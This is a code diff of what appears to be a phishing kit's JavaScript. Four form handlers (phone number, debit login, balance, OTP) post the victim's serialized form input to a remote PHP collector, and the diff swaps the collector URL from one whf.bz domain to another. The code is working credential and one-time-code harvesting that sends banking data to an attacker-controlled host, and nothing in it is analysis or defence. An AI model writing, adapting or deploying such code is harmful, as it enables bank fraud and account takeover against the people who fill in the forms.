@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-B/no.php',
+        url: 'https://kuda-terbang.whf.bz/notif/v1-6gt4v9a/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-B/login.php',
+        url: 'https://kuda-terbang.whf.bz/notif/v1-6gt4v9a/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-B/saldo.php',
+        url: 'https://kuda-terbang.whf.bz/notif/v1-6gt4v9a/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-B/otp.php',
+        url: 'https://kuda-terbang.whf.bz/notif/v1-6gt4v9a/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
